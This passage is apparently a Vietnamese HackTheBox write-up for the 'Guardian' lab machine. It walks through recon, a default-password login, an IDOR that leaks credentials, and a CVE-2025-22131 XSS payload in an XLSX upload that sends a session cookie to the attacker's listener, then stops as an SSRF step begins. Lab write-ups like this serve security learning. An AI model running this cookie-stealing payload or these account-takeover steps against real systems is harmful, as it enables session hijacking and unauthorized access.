    <div id="enumeration-and-gaining-access" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#enumeration-and-gaining-access" aria-label="Anchor">#</a>
    </span>
    
</h2>

<h3 class="relative group">Web summary
    <div id="web-summary" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#web-summary" aria-label="Anchor">#</a>
    </span>
    
</h3>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">whatweb http://guardian.htb/</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ whatweb http://guardian.htb/
</span></span><span class="line"><span class="cl">http://guardian.htb/ <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Apache<span class="o">[</span>2.4.52<span class="o">]</span>, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, Email<span class="o">[</span>GU0142023@guardian.htb,GU0702025@guardian.htb,GU6262023@guardian.htb,admissions@guardian.htb<span class="o">]</span>, HTML5, HTTPServer<span class="o">[</span>Ubuntu Linux<span class="o">][</span>Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP<span class="o">[</span>10.10.11.84<span class="o">]</span>, Script, Title<span class="o">[</span>Guardian University - Empowering Future Leaders<span class="o">]</span>   </span></span></code></pre></div></div>
<p>Dựa vào thông tin tổng quan, bước đầu khẳng định đây là website của 1 trường đại học, chứa một số thông tin về sinh viên như email. Từ đây có thể biết được format của mã số sinh viên (student ID) và format của email sinh viên. Thông thường, trong thực tế các trường đại học hay lấy email sinh viên để làm thông tin đăng nhập vào hệ thống học tập của trường.</p>
<p>Phân tích sâu hơn về format của student ID, nó sẽ có dạng <code>GUXXXXXX</code> với:</p>
<ul>
<li>4 số cuối dường như là năm, có thể là năm mà sinh viên này vào trường. Giả sử trường đại học này có thời gian học là 5 năm, vậy số năm sẽ kéo dài từ 2021 -&gt; 2025.</li>
<li>3 số đầu có thể là số thứ tự của sinh viên đó trong khóa, từ 000 -&gt; 999.</li>
</ul>
<p>Ngoài ra còn có email <code>admissions@guardian.htb</code> có thể là email quản lý.</p>

<h3 class="relative group">Directories
    <div id="directories" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#directories" aria-label="Anchor">#</a>
    </span>
    
</h3>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirsearch -u http://guardian.htb</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>03:42:15<span class="o">]</span> Starting:                                                                                                                             
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.ht_wsr.txt                                      
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htaccess.bak1                                   
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htaccess.orig                                   
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htaccess.sample                                 
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htaccess.save
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htaccess_extra                                  
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htaccess_sc
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htaccess_orig
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htaccessOLD2
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htaccessBAK
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htaccessOLD
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htm                                             
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.html
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htpasswds                                       
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.htpasswd_test
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:23<span class="o">]</span> <span class="m">403</span> -  277B  - /.httr-oauth
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:24<span class="o">]</span> <span class="m">403</span> -  277B  - /.php                                             
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:26<span class="o">]</span> <span class="m">301</span> -  309B  - /js  -&gt;  http://guardian.htb/js/                  
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:42<span class="o">]</span> <span class="m">403</span> -  277B  - /cgi-bin/                                         
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:43<span class="o">]</span> <span class="m">301</span> -  310B  - /css  -&gt;  http://guardian.htb/css/                
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:47<span class="o">]</span> <span class="m">301</span> -  313B  - /images  -&gt;  http://guardian.htb/images/          
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:47<span class="o">]</span> <span class="m">403</span> -  277B  - /images/                                          
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:48<span class="o">]</span> <span class="m">404</span> -   16B  - /index.php/login/                                 
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:48<span class="o">]</span> <span class="m">301</span> -  317B  - /javascript  -&gt;  http://guardian.htb/javascript/  
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:48<span class="o">]</span> <span class="m">403</span> -  277B  - /js/                                              
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:53<span class="o">]</span> <span class="m">403</span> -  277B  - /php5.fcgi                                        
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:55<span class="o">]</span> <span class="m">403</span> -  277B  - /server-status/                                   
</span></span><span class="line"><span class="cl"><span class="o">[</span>03:42:55<span class="o">]</span> <span class="m">403</span> -  277B  - /server-status   </span></span></code></pre></div></div>
<p>Sau khi truy cập các directories và phân tích, không tìm thấy thông tin đáng chú ý nào có thể dùng để làm dữ liệu khai thác.</p>

<h3 class="relative group">Vhosts
    <div id="vhosts" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#vhosts" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p>Thử <code>ffuf</code> lần đầu tiên, phát hiện ra size của web là 6741, thêm filter size với options <code>-fs</code></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u http://guardian.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -H <span class="s2">&#34;Host: FUZZ.guardian.htb&#34;</span> -r -t <span class="m">20</span> -fs <span class="m">6741</span></span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ffuf -u http://guardian.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -H <span class="s2">&#34;Host: FUZZ.guardian.htb&#34;</span> -r -t <span class="m">30</span> -fs <span class="m">6741</span> -fw <span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v2.1.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : http://guardian.htb
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.guardian.htb
</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">true</span>
</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">30</span>
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span><span class="line"><span class="cl"> :: Filter           : Response size: <span class="m">6741</span>
</span></span><span class="line"><span class="cl"> :: Filter           : Response words: <span class="m">1</span>
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gitea                   <span class="o">[</span>Status: 200, Size: 13498, Words: 1049, Lines: 245, Duration: 57ms<span class="o">]</span>
</span></span><span class="line"><span class="cl">portal                  <span class="o">[</span>Status: 200, Size: 2900, Words: 896, Lines: 84, Duration: 64ms<span class="o">]</span></span></span></code></pre></div></div>
<p>Thêm 2 vhost mới vào file hosts</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nano /etc/hosts</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">10.10.11.84     guardian.htb    gitea.guardian.htb    portal.guardian.htb</span></span></code></pre></div></div>
<p>Truy cập vào trang web và tìm thấy nơi truy cập <code>portal.guardian.htb</code></p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1663"
    height="766"
    src="/ctf/hackthebox/guardian/1_hu_4c73c72c4ecbb62d.png"
    srcset="/ctf/hackthebox/guardian/1_hu_4c73c72c4ecbb62d.png 800w, /ctf/hackthebox/guardian/1_hu_14410d28d0d9c8a1.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/1.png"></figure>
<p>Xem qua trang site chính thức của trường và thấy một số thông tin đã dự đoán ở trên.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1626"
    height="741"
    src="/ctf/hackthebox/guardian/2_hu_2d5fd91a8d8af1b4.png"
    srcset="/ctf/hackthebox/guardian/2_hu_2d5fd91a8d8af1b4.png 800w, /ctf/hackthebox/guardian/2_hu_54ad61e4dfeddb25.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/2.png"></figure>

<h3 class="relative group">portal.guardian.htb
    <div id="portalguardianhtb" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#portalguardianhtb" aria-label="Anchor">#</a>
    </span>
    
</h3>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1809"
    height="811"
    src="/ctf/hackthebox/guardian/3_hu_3948ef1e45399c36.png"
    srcset="/ctf/hackthebox/guardian/3_hu_3948ef1e45399c36.png 800w, /ctf/hackthebox/guardian/3_hu_15b044173dc30458.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/3.png"></figure>
<p>Đây chính là phần truy cập vào hệ thống của trường. Mục tiêu là tìm ra Username và Pasword. Ngay khi vào trang, 1 popup thông báo về việc checkout <code>Portal Guide</code></p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1476"
    height="841"
    src="/ctf/hackthebox/guardian/4_hu_ff273d09c08b2edb.png"
    srcset="/ctf/hackthebox/guardian/4_hu_ff273d09c08b2edb.png 800w, /ctf/hackthebox/guardian/4_hu_41f72abf8f04b487.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/4.png"></figure>
<p>Từ <code>Portal Guide</code> biết được mọi user khi được tạo mới đều có default password là <code>GU1234</code>. Trong thực tế, khá nhiều sinh viên không đổi password sau khi đăng nhập lần đầu vì cảm thấy không quan trọng.</p>
<p>Kết hợp với những dữ kiện đã dự đoán phía trên, tôi sẽ thử với 3 user được đề cập trên trang chủ của trường và default password và nhận được kết quả là user <code>GU0142023</code> không đổi password, có thể login bằng default password.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="3026"
    height="1494"
    src="/ctf/hackthebox/guardian/5_hu_e9f6680ca3dbcf28.png"
    srcset="/ctf/hackthebox/guardian/5_hu_e9f6680ca3dbcf28.png 800w, /ctf/hackthebox/guardian/5_hu_bfe72d3928ec822a.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/5.png"></figure>
<p>Lướt qua các thành phần của hệ thống học tập này, có một số thông tin nổi bật đáng chú ý:</p>
<ul>
<li><strong>My Course</strong> để xem các môn đang học.</li>
<li><strong>Assignments</strong> bao gồm các bài tập đã hoàn thành và các bài tập đang thực hiện.</li>
<li>Không thể xem được thông tin của các bài tập đã quá hạn, chỉ truy cập được các bài tập đang trong quá trình thực hiện.</li>
<li><strong>Chats</strong> bao gồm các tin nhắn giữa các sinh viên.</li>
<li><strong>Notice Board</strong> chứa thông báo của tất cả thành viên.</li>
</ul>
<p>Truy cập <strong>My Course</strong> -&gt; <strong>View Course</strong> tôi xem được thông tin môn học và có thể chuyển hướng đến <strong>Assignments</strong> hoặc <strong>Grades</strong>.</p>
<p>Trong <strong>Assignments</strong> chỉ có 1 bài tập đang thực hiện. Xem chi tiết, có một nơi để nộp bài tập, phần upload này chỉ cho phép file <code>.doc</code> và <code>.xlsx</code></p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="2958"
    height="1552"
    src="/ctf/hackthebox/guardian/6_hu_eaa8604e1af19ae.png"
    srcset="/ctf/hackthebox/guardian/6_hu_eaa8604e1af19ae.png 800w, /ctf/hackthebox/guardian/6_hu_a4c73bdd22b9667.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/6.png"></figure>

<h3 class="relative group">IDOR
    <div id="idor" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#idor" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p>Truy cập phần <strong>Chats</strong>, tôi có thể thực hiện type bất kỳ điều gì.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="2731"
    height="1225"
    src="/ctf/hackthebox/guardian/7_hu_d2b2fee122404e5.png"
    srcset="/ctf/hackthebox/guardian/7_hu_d2b2fee122404e5.png 800w, /ctf/hackthebox/guardian/7_hu_e24476b6c9fa1d8.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/7.png"></figure>
<p>Tuy nhiên để ý URL có một format khá quen thuộc <code>../index.php?page=</code>. Thử các lỗ hổng phổ biến cho format này như <code>LFI</code>, <code>Broken Access Control</code>, v.v&hellip; Tôi tìm được lỗ hổng <code>IDOR</code>, có thể truy cập đoạn hội thoại của những sinh viên khác mà không cần truy cập vào user của họ chỉ bằng cách thay đổi ID của <code>chat_users</code>.</p>
<p>Từ đây tôi cũng biết được user hiện tại <code>GU0142023</code> đang có ID là 13. Thử thay đổi ID thành những số thứ tự đầu tiên để tìm <code>admin</code> user, vì theo logic thông thường, những user có đặc quyền cao luôn được khởi tạo cùng với hệ thống và thường có ID 0 hoặc 1.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="2747"
    height="1265"
    src="/ctf/hackthebox/guardian/8_hu_3eaa27966f6e1c43.png"
    srcset="/ctf/hackthebox/guardian/8_hu_3eaa27966f6e1c43.png 800w, /ctf/hackthebox/guardian/8_hu_eda5b674c706aa18.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/8.png"></figure>
<p>Sau khi thay đổi chat thành ID 1 và 2 thì tôi nhận được thông tin đăng nhập mới của user <code>jamil.enockson</code>, và theo như câu phía trước thì đây là thông tin đăng nhập của <code>gitea</code>, một trong 2 vhost đã tìm được ở phần trên.</p>

<h3 class="relative group">gitea.guardian.htb
    <div id="giteaguardianhtb" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#giteaguardianhtb" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p>Truy cập <code>gitea</code> với thông tin đăng nhập vừa tìm được. Tuy nhiên khi đăng nhập bằng tên và password thì không được. Tôi quyết định thêm đuôi <code>@guardian.htb</code> để đăng nhập bằng email và thành công.</p>
<p>Với <code>gitea version 1.23.7</code>  tôi không tìm thấy exploit nào có thể khai thác được nên sẽ tạm thời bỏ qua hướng này.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="3024"
    height="1184"
    src="/ctf/hackthebox/guardian/9_hu_f0b6b83abca6da44.png"
    srcset="/ctf/hackthebox/guardian/9_hu_f0b6b83abca6da44.png 800w, /ctf/hackthebox/guardian/9_hu_f3084773fd4f381e.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/9.png"></figure>
<p>Trong <code>Explore</code> tôi có 2 repositories, là source code của 2 site <code>guardian.htb</code> và <code>portal.guardian.htb</code>. Phân tích 2 source này thì trang chủ không có nhiều ý nghĩa, chuyển sang <code>portal</code> tôi tìm được một số thông tin hữu ích.</p>
<p>Dành 1 khoảng thời gian tương đối để phân tích toàn bộ source code của <code>portal</code>, trong <code>/config/config.php</code> tôi tìm được thông tin đăng nhập <code>mysql</code> của user <code>root</code></p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="2658"
    height="1038"
    src="/ctf/hackthebox/guardian/10_hu_22fe05b8a4e7fb4f.png"
    srcset="/ctf/hackthebox/guardian/10_hu_22fe05b8a4e7fb4f.png 800w, /ctf/hackthebox/guardian/10_hu_b1f947a1dbaf4288.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/10.png"></figure>
<p>Trong <code>/student/submission.php</code> tôi tìm thấy đoạn server lưu file bài tập khi người dùng upload lên server. File upload sẽ được lưu trong <code>../attachment_uploads/</code> với <code>0777</code> permission.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1856"
    height="1219"
    src="/ctf/hackthebox/guardian/11_hu_a85f969b827f9db4.png"
    srcset="/ctf/hackthebox/guardian/11_hu_a85f969b827f9db4.png 800w, /ctf/hackthebox/guardian/11_hu_6e8f24889aa9487d.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/11.png"></figure>
<p>File <code>composer.json</code> ở ngay bên ngoài repo liệt kê các thư viện yêu cầu và phiên bản của nó.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1663"
    height="860"
    src="/ctf/hackthebox/guardian/12_hu_24241ab1b4cd7786.png"
    srcset="/ctf/hackthebox/guardian/12_hu_24241ab1b4cd7786.png 800w, /ctf/hackthebox/guardian/12_hu_3bb36c00021892e3.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/12.png"></figure>

<h3 class="relative group">CVE-2025-22131
    <div id="cve-2025-22131" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cve-2025-22131" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p>Thử tìm kiếm lỗ hổng của 2 thư viện này, tôi tìm được <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-22131"  target="_blank" rel="noreferrer">CVE-2025-22131</a>, một lỗ hổng của <code>phpoffice/phpspreadsheet 3.7.0</code>. Nói qua một chút về thư viện này, đây là thư viện của PHP để xử lý (đọc/ghi) các file spreadsheet như <code>.xlsx</code>. Khi thư viện chuyển một file XLSX thành dạng HTML và hiển thị ra màn hình, phần điều hướng (navigation menu) giữa các sheet bằng tên sheet có thể chèn được <strong>malicious code</strong>.</p>
<p>Tôi cũng tìm được <a href="https://github.com/s0ck37/CVE-2025-22131-POC"  target="_blank" rel="noreferrer">PoC</a> của lỗ hổng này trên github. Poc này sẽ tạo 1 file <code>.xlsx</code> có chứa XSS payload, khi upload thành công, web server sẽ xử lý file và thực hiện payload.</p>
<p>Clone git repo</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/s0ck37/CVE-2025-22131-POC.git</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> CVE-2025-22131-POC</span></span></code></pre></div></div>
<p>Lợi dụng lỗ hổng để upload XSS payload lấy cookie của <code>admin</code>, tạo 1 http listener để nhận cookie trả về từ server</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 generate.py <span class="s1">&#39;&lt;script&gt;fetch(&#34;http://10.10.14.165:8000/&#34;+document.cookie)&lt;/script&gt;&#39;</span></span></span></code></pre></div></div>
<p>File <code>.xlsx</code> được tạo thành công</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian/CVE-2025-22131-POC<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 generate.py <span class="s1">&#39;&lt;script&gt;fetch(&#34;http://10.10.14.165:8000/&#34;+document.cookie)&lt;/script&gt;&#39;</span>
</span></span><span class="line"><span class="cl">CVE-2025-22131 XSS Exploit by s0ck37
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Usage: python3 generate.py &lt;html&gt;
</span></span><span class="line"><span class="cl">Example: python3 generate.py <span class="s2">&#34;&lt;script&gt;alert(1)&lt;/script&gt;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Reading sample spreadsheet
</span></span><span class="line"><span class="cl">Embedding injection
</span></span><span class="line"><span class="cl">Generating final xslx
</span></span><span class="line"><span class="cl">Exploit written to exploit.xlsx</span></span></code></pre></div></div>
<p>Upload file này lên phần <code>Assignments</code> của <code>portal</code></p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1384"
    height="734"
    src="/ctf/hackthebox/guardian/13_hu_a733b577c41c5bef.png"
    srcset="/ctf/hackthebox/guardian/13_hu_a733b577c41c5bef.png 800w, /ctf/hackthebox/guardian/13_hu_b2e7ad3c54feb256.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/13.png"></figure>
<p>Sau khi upload thành công, quay trở lại listener, tôi nhận được cookie</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian/CVE-2025-22131-POC<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 -m http.server
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</span></span><span class="line"><span class="cl">10.10.11.84 - - <span class="o">[</span>14/Nov/2025 04:00:38<span class="o">]</span> code 404, message File not found
</span></span><span class="line"><span class="cl">10.10.11.84 - - <span class="o">[</span>14/Nov/2025 04:00:38<span class="o">]</span> <span class="s2">&#34;GET /PHPSESSID=suu0tijql6n34d37k1nq05d1g2 HTTP/1.1&#34;</span> <span class="m">404</span> -</span></span></code></pre></div></div>
<p>Sao chép token này vào Cookie Editor,.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="713"
    height="449"
    src="/ctf/hackthebox/guardian/14.png"
    srcset="/ctf/hackthebox/guardian/14.png 800w, /ctf/hackthebox/guardian/14.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/14.png"></figure>
<p>Lưu cookie và tải lại trang, tôi có được phiên truy cập của user <code>sammy.treat</code>.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1656"
    height="724"
    src="/ctf/hackthebox/guardian/15_hu_56d9d90789cf76a4.png"
    srcset="/ctf/hackthebox/guardian/15_hu_56d9d90789cf76a4.png 800w, /ctf/hackthebox/guardian/15_hu_efa384a5bc06e3b2.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/15.png"></figure>

<h3 class="relative group">SSRF - CSRF
    <div id="ssrf---csrf" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ssrf---csrf" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p>Sau khi thực hiện các chức năng của <code>portal</code> với user <code>sammy.treat</code> có quyền <code>lecture</code>, tôi tìm được lỗ hổng SSRF trong phần <code>Notice Board</code>.</p>
<p>Quyền <code>lecture</code> cho phép user được tạo Notice, bên trong notice có phần <code>Reference Link (will be reviewed by admin)</code>, có nghĩa là sau khi tạo notice, admin sẽ xử lý link này. Vậy thì tôi sẽ thử tạo notice và yêu cầu admin tải lên server 1 file từ attack machine.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1631"
    height="641"
    src="/ctf/hackthebox/guardian/16_hu_d5e73560aaad0a20.png"
    srcset="/ctf/hackthebox/guardian/16_hu_d5e73560aaad0a20.png 800w, /ctf/hackthebox/guardian/16_hu_9806d8883b2816b0.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/16.png"></figure>
